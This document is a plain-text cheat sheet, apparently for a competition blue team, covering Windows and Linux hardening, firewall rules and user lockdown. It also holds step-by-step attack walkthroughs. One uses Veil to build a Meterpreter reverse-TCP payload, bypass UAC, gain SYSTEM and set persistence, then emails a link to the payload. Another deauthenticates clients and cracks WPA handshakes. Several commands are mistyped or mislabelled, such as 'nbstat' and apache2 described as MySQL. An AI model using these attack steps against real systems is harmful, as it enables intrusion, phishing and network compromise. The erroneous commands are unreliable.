
BLUE TEAM STRATEGY Rev 1.0
====================

*** MAKE SURE IN WINDOWS SERVER 2012, and 7+ you run command prompt as Administrator!

Steps to lock down your Windows System:
=========================================

1. Disable all non-Windows services in Msconfig
	
	- Click "start" select "run", and type "msconfig" then press enter
	- Click the "Services" tab
	- Click Hide all Windows Services
	- Disable all non-Windows services still showing by clicking the "disable all" button
	- Click "Apply" in the lower right hand corner
	- Close Msconfig by clicking "Ok"
	- Msconfig will prompt for a restart, before clicking "yes" on the restart dialog do the following:
		- Open Command Prompt:
			--TYPE:
			- netsh firewall set opmode enable disable <--- Win XP
			- netsh advfirewall set allprofiles state on <--- Win 7+
			- schtasks /tn * /delete  <--- Deletes all scheduled tasks
			- shutdown /r /t 0  <----- Restarts the PC

2. Once the PC restarts:

	- Open Command Prompt:

	-- TYPE:
	- net user <accountname> <password> /add    <----- Adds a new user account to the machine with a password
	- net localgroup administrators <accountname> /add   <----- Adds your new user to the administrators group
	- wmic useraccount where name!='<accountname>' set disabled=true  <----- Disables all user accounts that are not the one you added
	- sc stop LanmanServer /yes	<----- Stops the Server service
	- sc config LanmanServer start= disabled  <---- Disables the Server Service
	- sc stop LmHosts /yes 		<----- Stops TCP/IP over Netbios service
	- sc config LmHosts start= disabled  <---- Disables the TCP/IP over Netbios Service

******* DO NOT DISABLE LANMANSERVER AND LMHOSTS IF PC IS ON ACTIVE DIRECTORY!

** If you want to ensure there is nothing malicious in the computer's temporary files you can clear them with: 

	  del /q/f/s %TEMP%\*  <--- This will delete all files in the Temporary folder for the account
	  del /q/f/s %Windir%\Temp <--- This will delete all temp files in the Windows directories




*** All of the above Windows commands you can put into a blank notepad file and then save it as a .bat file to run automatically. Remember to always save a batch file as "<filename>.bat" and choose "all files" under the drop down list.
	


See who is connected to you in Windows
---------------------------------------

> nbstat -b -o  (Need to be in Admin CMD!)

> type "taskkill /pid <pid> /f" to stop that connection

Alternatively use taskmanager and kick off user accounts connecting under users, and stop services related to meterpreter.
If an attacker has persistence on your machine you need to remove their persistent service/process or else this will be a losing game.


Helpful Powershell Commands
============================

-- Provide last 30 days of Security Events on Windows machines 7+ to a file

	- Get-EventLog Security -After (get-date).addDay(-30) > YourFile.txt
	
-- Stops the ability to execute scripts in Powershell
	
	- Set-ExecutionPolicy Restricted



Helpful Nmap Scan
===================

nmap -sS -O <ip>

for range:

nmap -sS -O 10.0.1.1-15



USE VEIL
===============
OPEN Terminal
TYPE Veil  ## If you have veil-evasion installed as one utility then type "veil-evasion" instead of just veil. Then continue to follow the instructions below.
Select Evasion with the command "use 2"
TYPE List
Select ruby/meterpreter/rev_tcp.rb BY TYPING "use 39"
TYPE set lhost <Your IP>
TYPE generate
GRAB PAYLOAD FROM cd /var/lib/veil/output/compiled
OR TYPE cd /var/lib/veil/output/compiled
TYPE mv payload.exe /root/Desktop
TYPE cd ~
TYPE  cd /var/lib/veil/output/handlers
TYPE msfconsole -r handler.rc
LEAVE HANDLER OPEN AND UPLOAD EXE TO VICTIM
TYPE sessions -i 1
TYPE background IN METERPRETER
TYPE use exploit/windows/local/bypassuac
TYPE set payload windows/meterpreter/reverse_tcp
TYPE set lhost <IP>
TYPE set lport <port>
TYPE set session 1
TYPE exploit
TYPE getsystem
TYPE getuid
TYPE run persistence

- Put your Payload in /var/www/html
THEN START APACHE2! 
- sudo service apache2 start

Then embed your payload in your email using ctrl+l to create a link, make sure your link is your machine's IP address followed by the payload

Example: 192.168.3.15/payload.exe


WPA & WEP CRACKING
===================
TYPE airmon-ng stop wlan0
TYPE the command that appears in the error message after typing "airmon-ng stop wlan0"
TYPE airmon-ng start wlan0
Enter Y if it asks you a Yes or No question about the interface
TYPE airodump-ng wlan0mon  ## Only add "mon" to the end if you run ifconfig and you see "mon" attached to the network card
RECORD channel and BSSID
TYPE airodump-ng -c <channel> --bssid <BSSID MAC> -w <filename> wlan0mon
RECORD station MAC
KEEP THIS WINDOW OPEN
TYPE aireplay-ng --arpreplay -b <BSSID MAC> -h <STATION MAC> wlan0mon  <---- FOR ARP REPLAY ATTACK
TYPE aireplay-ng --deauth 0 -c <STATION MAC> -a <ROUTER MAC> wlan0mon   <---- FOR DEAUTH ATTACK (Easier if no new devices are connecting to the target network)
WAIT FOR HANDSHAKE IN PREVIOUS WINDOW
TYPE aircrack-ng -b <BSSID MAC> -w <wordlist.txt> <file-01.cap>  <----- TO BEGIN CRACK


SETTING LINUX FIREWALL
======================
iptables -F INPUT
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P INPUT DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 443 -j ACCEPT
iptables-save  > /usr/local/etc/myconfig.fw
vi /etc/network/interfaces


ONCE YOU OPEN THE "INTERFACES" DOCUMENT ENTER IN:

auto eth0
iface eth0 inet dhcp
pre-up iptables-restore < /usr/local/etc/myconfig.fw

THEN SAVE AND QUIT BY PRESSING ESCAPE, THEN SHIFT + : AND THEN "wq"

** Your firewall should now be set to only allow for traffic on ports 22, 80, and 443. This will stop your meterpreter from working if you do this on Kali!!!
** To add exceptions for meterpreter in Kali, enter "iptables -A INPUT -m state --state NEW -p tcp --dport 4444 -j ACCEPT" and "iptables -A OUTPUT -m state --state NEW -p tcp --dport 4444 -j ACCEPT" after you put in the entry for port 443.

IF you created a ruby script store it in usr/share/metasploit-framework/scripts
call on it using "run <scriptname>.rb" when in a meterpreter session.



Setting up Linux
====================

Change IP address and subnet mask:
-----------------------------------

> ifconfig eth0 <ip> netmask 255.255.255.0

Disable Promiscuous mode:
--------------------------

> ifconfig eth0 -promisc

Turn interface on and off:
--------------------------

> ifconfig eth0 up

> ifconfig eth0 down


Add/Remove User accounts
--------------------------

> adduser <username>

> deluser <username>


Add user to Sudo Group
------------------------

usermod -aG sudo <username>

** Be careful with who you give Super User to!


To disable user access
---------------------------

> vi /etc/passwd

> Change /bin/bash at the end of user to /bin/nologin

> shift + : then type wq to exit vim

or

> passwd -l <username> <---- Locks

> passwd -u <username> <---- Unlocks


See who is connected to you in Linux
---------------------------------------

> netstat -natp

> type "kill -9 <pid>" to stop that connection


See processes allowing port connections
----------------------------------------
netstat -lp


View processes running in Linux
===============================

> ps -aux | less
or
> ps -a

View services running on Linux
===============================

> ps ax
or
> service --status-all


Stop Services running in Linux
===================================
> chkconfig apache2 off <---- Turns off Mysql Server
or
> sudo service apache2 stop
or
> systemctl stop apache2
or
> sudo stop apache2 (deprecated method; may not work!)

Disable at startup
=====================

> update-rc.d -f apache2 remove
or
> systemctl disable apache2
